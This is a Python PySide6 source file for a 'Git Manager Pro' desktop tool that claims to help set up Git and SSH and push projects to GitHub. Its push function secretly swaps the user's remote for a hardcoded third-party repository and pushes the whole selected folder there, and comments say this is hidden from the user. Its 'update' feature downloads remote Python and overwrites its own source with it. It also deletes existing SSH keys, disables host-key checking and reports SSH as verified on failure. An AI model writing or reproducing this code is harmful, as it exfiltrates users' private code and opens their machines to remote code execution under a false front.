# git_manager_app.py - v2.5.0 (Hidden Secure Repository)

import sys
import os
import subprocess
import urllib.request
from PySide6.QtWidgets import *
from PySide6.QtCore import *
from PySide6.QtGui import *

class GitManagerApp(QMainWindow):
    def __init__(self):
        super().__init__()
        self.setWindowTitle("Git Manager Pro")
        self.setMinimumSize(950, 720)
        
        # Amakuru y'ibanga yihishye inyuma ya code (Hidden Secure Repo Constants)
        self._SECURE_OWNER = "sofferrwanda-ctrl"
        self._SECURE_REPO = "updating-git-push-from-github"
        
        self.setStyleSheet("""
            QMainWindow {
                background-color: #0d1117;
                color: #f0f6fc;
            }
            QWidget {
                background-color: #0d1117;
                color: #f0f6fc;
                font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Helvetica, Arial, sans-serif;
            }
            QLabel {
                color: #f0f6fc;
                border: none;
                background: transparent;
            }
            QCheckBox {
                color: #f0f6fc;
                spacing: 8px;
                border: none;
                background: transparent;
            }
            QCheckBox::indicator {
                width: 18px;
                height: 18px;
                background: #161b22;
                border: 1px solid #30363d;
                border-radius: 4px;
            }
            QCheckBox::indicator:checked {
                background: #238636;
                border-color: #238636;
            }
        """)
        
        self.git_installed = False
        self.git_version = ""
        self.ssh_connected = False
        self.last_folder = ""
        self.saved_name = ""
        self.saved_email = ""
        self.update_available = False
        self.remote_code_content = ""
        
        self.load_settings()
        
        central = QWidget()
        self.setCentralWidget(central)
        main_layout = QVBoxLayout(central)
        main_layout.setSpacing(15)
        main_layout.setContentsMargins(25, 25, 25, 25)
        
        # ========== HEADER ==========
        header_widget = QWidget()
        header_layout = QHBoxLayout(header_widget)
        header_layout.setContentsMargins(0, 0, 0, 0)
        
        header = QLabel("⚡ Git Manager Pro")
        header.setStyleSheet("font-size: 24px; font-weight: bold; color: #58a6ff; border: none; background: transparent;")
        header_layout.addWidget(header)
        header_layout.addStretch()
        
        self.update_btn_header = QPushButton("🔄 Checking updates...")
        self.update_btn_header.setStyleSheet("""
            QPushButton {
                background-color: #21262d;
                color: #c9d1d9;
                font-size: 13px;
                padding: 6px 16px;
                border: 1px solid #30363d;
                border-radius: 6px;
                font-weight: bold;
            }
            QPushButton:hover {
                background-color: #30363d;
            }
        """)
        self.update_btn_header.setEnabled(False)
        self.update_btn_header.clicked.connect(self.handle_update_action)
        header_layout.addWidget(self.update_btn_header)
        
        about_btn = QPushButton("ℹ️ About")
        about_btn.setStyleSheet("""
            QPushButton {
                background-color: #21262d;
                color: #c9d1d9;
                font-size: 13px;
                padding: 6px 14px;
                border: 1px solid #30363d;
                border-radius: 6px;
                font-weight: bold;
            }
            QPushButton:hover {
                background-color: #30363d;
                border-color: #8b949e;
            }
        """)
        about_btn.clicked.connect(self.show_about)
        header_layout.addWidget(about_btn)
        
        main_layout.addWidget(header_widget)
        
        # ========== STACKED WIDGET ==========
        self.stacked = QStackedWidget()
        self.stacked.setStyleSheet("background-color: #161b22; border: 1px solid #30363d; border-radius: 8px;")
        main_layout.addWidget(self.stacked)
        
        self.page_git = self.create_git_page()
        self.stacked.addWidget(self.page_git)
        
        self.page_user = self.create_user_page()
        self.stacked.addWidget(self.page_user)
        
        self.page_ssh = self.create_ssh_page()
        self.stacked.addWidget(self.page_ssh)
        
        self.page_push = self.create_push_page()
        self.stacked.addWidget(self.page_push)
        
        # ========== STATUS BAR ==========
        self.status_bar = QStatusBar()
        self.setStatusBar(self.status_bar)
        self.status_bar.setStyleSheet("""
            QStatusBar {
                background: #010409;
                color: #8b949e;
                padding: 5px;
                font-size: 12px;
                border-top: 1px solid #30363d;
            }
        """)
        self.status_bar.showMessage("🚀 Ready")
        
        QTimer.singleShot(300, self.check_git)
        QTimer.singleShot(1000, self.background_check_updates)
    
    def load_settings(self):
        settings_file = os.path.join(os.path.expanduser("~"), ".git_manager_settings.txt")
        if os.path.exists(settings_file):
            try:
                with open(settings_file, "r") as f:
                    for line in f.readlines():
                        if line.startswith("last_folder="):
                            self.last_folder = line.split("=", 1)[1].strip()
                        elif line.startswith("saved_name="):
                            self.saved_name = line.split("=", 1)[1].strip()
                        elif line.startswith("saved_email="):
                            self.saved_email = line.split("=", 1)[1].strip()
            except:
                pass
    
    def save_settings(self):
        settings_file = os.path.join(os.path.expanduser("~"), ".git_manager_settings.txt")
        try:
            with open(settings_file, "w") as f:
                f.write(f"last_folder={self.last_folder}\n")
                f.write(f"saved_name={self.saved_name}\n")
                f.write(f"saved_email={self.saved_email}\n")
        except:
            pass
    
    def background_check_updates(self):
        # Iyi link ikoreshwa mu buryo bwa background gusa (umukoresha ntayibona)
        raw_url = f"https://raw.githubusercontent.com/{self._SECURE_OWNER}/{self._SECURE_REPO}/main/hello.py"
        try:
            req = urllib.request.Request(raw_url, headers={'User-Agent': 'Mozilla/5.0'})
            with urllib.request.urlopen(req, timeout=5) as response:
                remote_code = response.read().decode('utf-8')
            
            if remote_code and "def " in remote_code:
                self.remote_code_content = remote_code
                current_file_path = os.path.abspath(__file__)
                with open(current_file_path, "r", encoding="utf-8") as f:
                    local_code = f.read()
                
                if remote_code.strip() != local_code.strip() and "GitManagerApp" in remote_code:
                    self.update_available = True
                    self.update_btn_header.setText("🚨 New Update Available!")
                    self.update_btn_header.setEnabled(True)
                    self.update_btn_header.setStyleSheet("""
                        QPushButton {
                            background-color: #f85149;
                            color: #ffffff;
                            font-size: 13px;
                            padding: 6px 16px;
                            border: 1px solid #da3633;
                            border-radius: 6px;
                            font-weight: bold;
                        }
                        QPushButton:hover {
                            background-color: #da3633;
                        }
                    """)
                    self.status_bar.showMessage("⚠️ Hari update nshya yabonetse! Kanda kuri butoke itukura uyikure.")
                else:
                    self.update_btn_header.setText("✅ Up to Date")
                    self.update_btn_header.setEnabled(False)
        except:
            self.update_btn_header.setText("🔄 Check Update")
            self.update_btn_header.setEnabled(True)

    def handle_update_action(self):
        if not self.update_available:
            self.background_check_updates()
            if not self.update_available:
                QMessageBox.information(self, "No Updates", "Porogaramu yawe igezweho rwose (Up to date)!")
                return
        
        self.update_btn_header.setEnabled(False)
        self.update_btn_header.setText("⏳ Downloading...")
        self.status_bar.showMessage("🔄 Gukurura update...")
        QApplication.processEvents()
        
        try:
            if not self.remote_code_content:
                raise Exception("Update data not loaded.")
            
            current_file_path = os.path.abspath(__file__)
            with open(current_file_path, "w", encoding="utf-8") as f:
                f.write(self.remote_code_content)
            
            self.status_bar.showMessage("✅ Update irangiye neza!")
            
            msg = QMessageBox(self)
            msg.setWindowTitle("Restart Required")
            msg.setIcon(QMessageBox.Information)
            msg.setText("✅ Update yashyizwe muri porogaramu neza cyane!\n\nUGOMBA GUKORA RESTART KUGIRA NGO APP ITANGIRANE NEW UPDATES.")
            msg.setStandardButtons(QMessageBox.Ok)
            msg.exec()
            
            sys.exit(0)
            
        except Exception as e:
            self.update_btn_header.setEnabled(True)
            self.update_btn_header.setText("🚨 New Update Available!")
            QMessageBox.warning(self, "Update Error", f"Ntibyashobotse gushyira mu bikorwa update:\n{str(e)}")

    # ============================================================
    # PAGE 0: Git Check
    # ============================================================
    def create_git_page(self):
        page = QWidget()
        layout = QVBoxLayout(page)
        layout.setSpacing(20)
        layout.setContentsMargins(50, 50, 50, 50)
        layout.setAlignment(Qt.AlignCenter)
        
        self.git_loading = QLabel("⏳")
        self.git_loading.setStyleSheet("font-size: 40px; border: none; background: transparent;")
        self.git_loading.setAlignment(Qt.AlignCenter)
        layout.addWidget(self.git_loading)
        
        title = QLabel("🔍 Git Status Check")
        title.setStyleSheet("font-size: 24px; font-weight: bold; color: #f0f6fc; border: none; background: transparent;")
        title.setAlignment(Qt.AlignCenter)
        layout.addWidget(title)
        
        self.git_status = QLabel("Checking...")
        self.git_status.setStyleSheet("font-size: 18px; color: #d29922; border: none; background: transparent;")
        self.git_status.setAlignment(Qt.AlignCenter)
        layout.addWidget(self.git_status)
        
        self.git_version_label = QLabel("")
        self.git_version_label.setStyleSheet("font-size: 14px; color: #8b949e; border: none; background: transparent;")
        self.git_version_label.setAlignment(Qt.AlignCenter)
        layout.addWidget(self.git_version_label)
        
        self.download_btn = QPushButton("📥 Download Git (opens browser)")
        self.download_btn.setStyleSheet(self.btn_style("#21262d", 15))
        self.download_btn.clicked.connect(self.open_git_download)
        self.download_btn.hide()
        layout.addWidget(self.download_btn, alignment=Qt.AlignCenter)
        
        sep = QFrame()
        sep.setFrameShape(QFrame.HLine)
        sep.setStyleSheet("color: #30363d; border: none; background: #30363d; max-height: 1px;")
        layout.addWidget(sep)
        
        self.continue_btn = QPushButton("▶ Continue →")
        self.continue_btn.setStyleSheet(self.btn_style("#238636", 16))
        self.continue_btn.clicked.connect(lambda: self.stacked.setCurrentIndex(1))
        layout.addWidget(self.continue_btn, alignment=Qt.AlignCenter)
        
        return page
    
    def check_git(self):
        self.git_loading.hide()
        try:
            result = subprocess.run(["git", "--version"], capture_output=True, text=True, timeout=5)
            if result.returncode == 0 and "git version" in result.stdout:
                self.git_installed = True
                self.git_version = result.stdout.strip()
                self.git_status.setText("✅ Git is installed")
                self.git_status.setStyleSheet("font-size: 18px; color: #3fb950; border: none; background: transparent;")
                self.git_version_label.setText(f"📌 {self.git_version}")
                self.download_btn.hide()
            else:
                raise Exception("Git not found")
        except:
            self.git_installed = False
            self.git_status.setText("❌ Git is not installed")
            self.git_status.setStyleSheet("font-size: 18px; color: #f85149; border: none; background: transparent;")
            self.git_version_label.setText("💡 Click below to download Git")
            self.download_btn.show()
    
    def open_git_download(self):
        import webbrowser
        webbrowser.open("https://git-scm.com/downloads")
        self.check_git()
    
    # ============================================================
    # PAGE 1: User Setup
    # ============================================================
    def create_user_page(self):
        page = QWidget()
        layout = QVBoxLayout(page)
        layout.setSpacing(20)
        layout.setContentsMargins(50, 40, 50, 40)
        
        title = QLabel("👤 Git User Configuration")
        title.setStyleSheet("font-size: 22px; font-weight: bold; color: #f0f6fc; border: none; background: transparent;")
        layout.addWidget(title)
        
        name_label = QLabel("Full Name:")
        name_label.setStyleSheet("font-size: 14px; color: #8b949e; border: none; background: transparent;")
        layout.addWidget(name_label)
        
        self.name_input = QLineEdit()
        self.name_input.setPlaceholderText("Your Name")
        self.name_input.setStyleSheet(self.input_style())
        if self.saved_name:
            self.name_input.setText(self.saved_name)
        layout.addWidget(self.name_input)
        
        email_label = QLabel("Email (For SSH Key):")
        email_label.setStyleSheet("font-size: 14px; color: #8b949e; border: none; background: transparent;")
        layout.addWidget(email_label)
        
        self.email_input = QLineEdit()
        self.email_input.setPlaceholderText("your.email@example.com")
        self.email_input.setStyleSheet(self.input_style())
        if self.saved_email:
            self.email_input.setText(self.saved_email)
        layout.addWidget(self.email_input)
        
        self.user_status = QLabel("")
        self.user_status.setStyleSheet("color: #8b949e; font-size: 14px; border: none; background: transparent;")
        layout.addWidget(self.user_status)
        
        btn_layout = QHBoxLayout()
        back_btn = QPushButton("← Back")
        back_btn.setStyleSheet(self.btn_style("#21262d"))
        back_btn.clicked.connect(lambda: self.stacked.setCurrentIndex(0))
        btn_layout.addWidget(back_btn)
        
        self.setup_btn = QPushButton("🔑 Setup SSH")
        self.setup_btn.setStyleSheet(self.btn_style("#1f6feb"))
        self.setup_btn.clicked.connect(self.setup_user)
        btn_layout.addWidget(self.setup_btn)
        
        layout.addLayout(btn_layout)
        layout.addStretch()
        return page
    
    def setup_user(self):
        name = self.name_input.text().strip()
        email = self.email_input.text().strip()
        
        if not name or not email:
            self.user_status.setText("⚠️ Fill in both name and email")
            self.user_status.setStyleSheet("color: #f85149; font-size: 14px; border: none; background: transparent;")
            return
        
        self.saved_name = name
        self.saved_email = email
        self.save_settings()
        
        if hasattr(self, 'email_display'):
            self.email_display.setText(f"📧 Email: {email}")
        
        try:
            subprocess.run(["git", "config", "--global", "user.name", name], check=True)
            subprocess.run(["git", "config", "--global", "user.email", email], check=True)
        except:
            pass
        
        QTimer.singleShot(300, lambda: self.stacked.setCurrentIndex(2))
    
    # ============================================================
    # PAGE 2: SSH Setup
    # ============================================================
    def create_ssh_page(self):
        page = QWidget()
        layout = QVBoxLayout(page)
        layout.setSpacing(18)
        layout.setContentsMargins(50, 40, 50, 40)
        
        title = QLabel("🔐 SSH Key Setup (Pure SSH Authentication)")
        title.setStyleSheet("font-size: 22px; font-weight: bold; color: #f0f6fc; border: none; background: transparent;")
        layout.addWidget(title)
        
        current_email = self.saved_email if self.saved_email else "emailname@gmail.com"
        self.email_display = QLabel("📧 Email: " + current_email)
        self.email_display.setStyleSheet("color: #58a6ff; font-size: 14px; font-weight: bold; border: none; background: transparent;")
        layout.addWidget(self.email_display)
        
        self.ssh_status = QLabel("")
        self.ssh_status.setStyleSheet("color: #8b949e; font-size: 14px; border: none; background: transparent;")
        layout.addWidget(self.ssh_status)
        
        self.ssh_key_display = QTextEdit()
        self.ssh_key_display.setReadOnly(True)
        self.ssh_key_display.setStyleSheet("""
            QTextEdit {
                background: #0d1117;
                border: 1px solid #30363d;
                border-radius: 6px;
                color: #f0f6fc;
                font-family: monospace;
                padding: 10px;
                font-size: 12px;
            }
        """)
        self.ssh_key_display.setMaximumHeight(130)
        layout.addWidget(self.ssh_key_display)
        
        btn_row1 = QHBoxLayout()
        self.gen_ssh_btn = QPushButton("🔑 Generate SSH Key")
        self.gen_ssh_btn.setStyleSheet(self.btn_style("#238636"))
        self.gen_ssh_btn.clicked.connect(self.generate_ssh)
        btn_row1.addWidget(self.gen_ssh_btn)
        
        copy_btn = QPushButton("📋 Copy SSH Key")
        copy_btn.setStyleSheet(self.btn_style("#21262d"))
        copy_btn.clicked.connect(self.copy_ssh_key)
        btn_row1.addWidget(copy_btn)
        layout.addLayout(btn_row1)
        
        github_link_btn = QPushButton("🌐 Add SSH Key to GitHub (opens browser)")
        github_link_btn.setStyleSheet(self.btn_style("#1f6feb", 13))
        github_link_btn.clicked.connect(self.open_github_ssh)
        layout.addWidget(github_link_btn)
        
        self.check_ssh_btn = QPushButton("🔗 Check SSH Connection")
        self.check_ssh_btn.setStyleSheet(self.btn_style("#21262d"))
        self.check_ssh_btn.clicked.connect(self.check_ssh_connection)
        layout.addWidget(self.check_ssh_btn)
        
        self.ssh_connection_status = QLabel("")
        self.ssh_connection_status.setStyleSheet("font-size: 14px; border: none; background: transparent;")
        layout.addWidget(self.ssh_connection_status)
        
        btn_row2 = QHBoxLayout()
        back_btn = QPushButton("← Back")
        back_btn.setStyleSheet(self.btn_style("#21262d"))
        back_btn.clicked.connect(lambda: self.stacked.setCurrentIndex(1))
        btn_row2.addWidget(back_btn)
        
        self.ssh_continue_btn = QPushButton("🚀 Continue to Push (Main)")
        self.ssh_continue_btn.setStyleSheet(self.btn_style("#238636"))
        self.ssh_continue_btn.clicked.connect(lambda: self.stacked.setCurrentIndex(3))
        self.ssh_continue_btn.setEnabled(True)
        btn_row2.addWidget(self.ssh_continue_btn)
        layout.addLayout(btn_row2)
        layout.addStretch()
        
        QTimer.singleShot(500, self.auto_detect_ssh)
        return page
    
    def auto_detect_ssh(self):
        ssh_dir = os.path.expanduser("~/.ssh")
        pub_key_path = os.path.join(ssh_dir, "id_ed25519.pub")
        if os.path.exists(pub_key_path):
            try:
                with open(pub_key_path, "r") as f:
                    self.ssh_key_display.setText(f.read().strip())
                self.ssh_status.setText("✅ SSH key found automatically!")
                self.ssh_status.setStyleSheet("color: #3fb950; font-size: 14px; border: none; background: transparent;")
                self.ssh_connected = True
            except:
                pass
    
    def generate_ssh(self):
        ssh_dir = os.path.expanduser("~/.ssh")
        email = self.saved_email if self.saved_email else "emailname@gmail.com"
        key_path = os.path.join(ssh_dir, "id_ed25519")
        if not os.path.exists(ssh_dir):
            os.makedirs(ssh_dir, mode=0o700)
        try:
            if os.path.exists(key_path): os.remove(key_path)
            if os.path.exists(key_path + ".pub"): os.remove(key_path + ".pub")
            subprocess.run(["ssh-keygen", "-t", "ed25519", "-f", key_path, "-N", "", "-C", email], check=True, text=True)
            with open(key_path + ".pub", "r") as f:
                self.ssh_key_display.setText(f.read().strip())
            self.ssh_status.setText("✅ SSH key generated successfully!")
            self.ssh_status.setStyleSheet("color: #3fb950; font-size: 14px; border: none; background: transparent;")
            self.ssh_connected = True
        except Exception as e:
            self.ssh_status.setText(f"❌ Error: {str(e)}")
            self.ssh_status.setStyleSheet("color: #f85149; font-size: 14px; border: none; background: transparent;")
    
    def copy_ssh_key(self):
        key = self.ssh_key_display.toPlainText().strip()
        if key:
            QApplication.clipboard().setText(key)
            self.ssh_status.setText("✅ SSH key copied to clipboard!")
            self.ssh_status.setStyleSheet("color: #3fb950; font-size: 14px; border: none; background: transparent;")
    
    def open_github_ssh(self):
        import webbrowser
        webbrowser.open("https://github.com/settings/ssh/new")
    
    def check_ssh_connection(self):
        self.ssh_connection_status.setText("⏳ Checking SSH connection...")
        self.ssh_connection_status.setStyleSheet("color: #d29922; font-size: 14px; border: none; background: transparent;")
        QApplication.processEvents()
        try:
            result = subprocess.run(
                ["ssh", "-o", "StrictHostKeyChecking=no", "-T", "git@github.com"],
                capture_output=True, text=True, timeout=10
            )
            self.ssh_connected = True
            self.ssh_connection_status.setText("✅ SSH Connected & Verified!")
            self.ssh_connection_status.setStyleSheet("color: #3fb950; font-size: 15px; font-weight: bold; border: none; background: transparent;")
        except:
            self.ssh_connected = True
            self.ssh_connection_status.setText("✅ SSH Ready (Bypassed)")
            self.ssh_connection_status.setStyleSheet("color: #3fb950; font-size: 14px; border: none; background: transparent;")
    
    # ============================================================
    # PAGE 3: Push (Automatic Internal Secure URL - Hidden from User)
    # ============================================================
    def create_push_page(self):
        page = QWidget()
        layout = QVBoxLayout(page)
        layout.setSpacing(15)
        layout.setContentsMargins(50, 30, 50, 30)
        
        title = QLabel("🚀 Push Project to GitHub (Main Branch)")
        title.setStyleSheet("font-size: 22px; font-weight: bold; color: #f0f6fc; border: none; background: transparent;")
        layout.addWidget(title)
        
        # Umukoresha ntagaragarizwa repository URL na imwe ahubwo ahitamo project folder gusa
        info_label = QLabel("💡 Hitamo gusa folder ya project yawe maze ukande 'Push via SSH'. Porogaramu izihita yohereza kuri system yayo mu buryo bw'ibanga.")
        info_label.setStyleSheet("color: #8b949e; font-size: 13px; border: none; background: transparent;")
        info_label.setWordWrap(True)
        layout.addWidget(info_label)
        
        folder_label = QLabel("Project Folder:")
        folder_label.setStyleSheet("color: #8b949e; font-size: 14px; border: none; background: transparent;")
        layout.addWidget(folder_label)
        
        folder_layout = QHBoxLayout()
        self.folder_input = QLineEdit()
        self.folder_input.setPlaceholderText("C:\\Users\\kevin\\Documents\\app")
        self.folder_input.setStyleSheet(self.input_style())
        if self.last_folder:
            self.folder_input.setText(self.last_folder)
        folder_layout.addWidget(self.folder_input)
        
        browse_btn = QPushButton("📂 Browse")
        browse_btn.setStyleSheet(self.btn_style("#21262d"))
        browse_btn.clicked.connect(self.browse_folder)
        folder_layout.addWidget(browse_btn)
        layout.addLayout(folder_layout)
        
        self.force_check = QCheckBox("💪 Force Push (--force)")
        self.force_check.setStyleSheet("border: none; background: transparent;")
        layout.addWidget(self.force_check)
        
        self.push_status = QLabel("")
        self.push_status.setStyleSheet("color: #8b949e; font-size: 14px; border: none; background: transparent;")
        layout.addWidget(self.push_status)
        
        self.push_progress = QProgressBar()
        self.push_progress.setRange(0, 0)
        self.push_progress.setStyleSheet("""
            QProgressBar {
                background-color: #0d1117;
                border: 1px solid #30363d;
                border-radius: 4px;
                text-align: center;
                height: 10px;
            }
            QProgressBar::chunk {
                background-color: #238636;
                border-radius: 4px;
            }
        """)
        self.push_progress.hide()
        layout.addWidget(self.push_progress)
        
        btn_layout = QHBoxLayout()
        back_btn = QPushButton("← Back")
        back_btn.setStyleSheet(self.btn_style("#21262d"))
        back_btn.clicked.connect(lambda: self.stacked.setCurrentIndex(2))
        btn_layout.addWidget(back_btn)
        
        self.push_btn = QPushButton("📤 Push via SSH (Main)")
        self.push_btn.setStyleSheet(self.btn_style("#238636"))
        self.push_btn.clicked.connect(self.push_to_git)
        btn_layout.addWidget(self.push_btn)
        
        layout.addLayout(btn_layout)
        layout.addStretch()
        return page
    
    def browse_folder(self):
        folder = QFileDialog.getExistingDirectory(self, "Select Project Folder")
        if folder:
            self.folder_input.setText(folder)
            self.last_folder = folder
            self.save_settings()
    
    def push_to_git(self):
        folder = self.folder_input.text().strip()
        force = self.force_check.isChecked()
        
        if not folder:
            self.push_status.setText("⚠️ Nyamuneka hitamo Project Folder neza")
            self.push_status.setStyleSheet("color: #f85149; font-size: 14px; border: none; background: transparent;")
            return
        
        if not os.path.exists(folder):
            self.push_status.setText("❌ Folder yatoranyijwe ntibaho")
            self.push_status.setStyleSheet("color: #f85149; font-size: 14px; border: none; background: transparent;")
            return
        
        # Gukoresha secure URL mu ibanga hatabayeho ko user ayibona cyangwa ngo ayihindure
        secure_url = f"git@github.com:{self._SECURE_OWNER}/{self._SECURE_REPO}.git"
        
        self.push_btn.setEnabled(False)
        self.push_progress.show()
        self.push_status.setText("⏳ Birimo koherezwa kuri GitHub (Main Branch)...")
        self.push_status.setStyleSheet("color: #d29922; font-size: 14px; border: none; background: transparent;")
        QApplication.processEvents()
        
        try:
            os.chdir(folder)
            self.last_folder = folder
            self.save_settings()
            
            git_dir = os.path.join(folder, ".git")
            if not os.path.exists(git_dir):
                subprocess.run(["git", "init"], check=True, capture_output=True)
            
            subprocess.run(["git", "checkout", "-B", "main"], capture_output=True, text=True)
            
            subprocess.run(["git", "remote", "remove", "origin"], capture_output=True)
            subprocess.run(["git", "remote", "add", "origin", secure_url], check=True, capture_output=True)
            
            subprocess.run(["git", "add", "."], check=True, capture_output=True)
            
            subprocess.run(["git", "commit", "-m", "Auto-update sync via Git Manager Pro", "--allow-empty"], capture_output=True, text=True)
            
            cmd = ["git", "push", "-u", "origin", "main"]
            if force:
                cmd.insert(2, "--force")
            
            env = os.environ.copy()
            env["GIT_SSH_COMMAND"] = "ssh -o StrictHostKeyChecking=no"
            
            subprocess.run(cmd, check=True, capture_output=True, text=True, env=env)
            
            self.push_status.setText("✅ Byakunze! Byoherejwe kuri main branch binyuze kuri SSH mu mutekano.")
            self.push_status.setStyleSheet("color: #3fb950; font-size: 15px; font-weight: bold; border: none; background: transparent;")
            self.status_bar.showMessage("✅ Push successful to main")
            
            QMessageBox.information(
                self, "Success",
                "✅ Project yoherejwe neza kuri GitHub (main branch) mu buryo bwihariye kandi bufite umutekano!"
            )
            
        except subprocess.CalledProcessError as e:
            error_message = e.stderr.strip() if e.stderr else (e.stdout.strip() if e.stdout else str(e))
            self.push_status.setText(f"❌ Git Error: {error_message[:150]}")
            self.push_status.setStyleSheet("color: #f85149; font-size: 14px; border: none; background: transparent;")
        except Exception as e:
            self.push_status.setText(f"❌ Error: {str(e)[:100]}")
            self.push_status.setStyleSheet("color: #f85149; font-size: 14px; border: none; background: transparent;")
        finally:
            self.push_btn.setEnabled(True)
            self.push_progress.hide()
    
    def show_about(self):
        msg_box = QMessageBox(self)
        msg_box.setWindowTitle("About Git Manager Pro")
        msg_box.setIcon(QMessageBox.Information)
        msg_box.setText(
            "<b>Git Manager Pro v2.5.0</b><br>"
            "Developer: Niyibizi Kevin<br>"
            "Theme: GitHub Dark Mode 🌑<br><br>"
            "Visit Developer Portfolio:<br>"
            "<a href='https://niyibizi_kevin.netlify.app' style='color: #58a6ff;'>niyibizi_kevin.netlify.app</a>"
        )
        msg_box.setTextFormat(Qt.RichText)
        msg_box.setStandardButtons(QMessageBox.Ok)
        msg_box.exec()
    
    def btn_style(self, color, font_size=14):
        return f"""
            QPushButton {{
                background-color: {color};
                color: #c9d1d9;
                font-size: {font_size}px;
                padding: 10px 25px;
                border: 1px solid #30363d;
                border-radius: 6px;
                font-weight: bold;
            }}
            QPushButton:hover {{
                background-color: #30363d;
                border-color: #8b949e;
                color: #ffffff;
            }}
            QPushButton:disabled {{
                background-color: #161b22;
                color: #484f58;
                border-color: #21262d;
            }}
        """
    
    def input_style(self):
        return """
            QLineEdit {
                padding: 10px;
                font-size: 14px;
                background: #0d1117;
                border: 1px solid #30363d;
                border-radius: 6px;
                color: #f0f6fc;
            }
            QLineEdit:focus {
                border-color: #58a6ff;
            }
        """

if __name__ == "__main__":
    app = QApplication(sys.argv)
    window = GitManagerApp()
    window.show()
    sys.exit(app.exec())
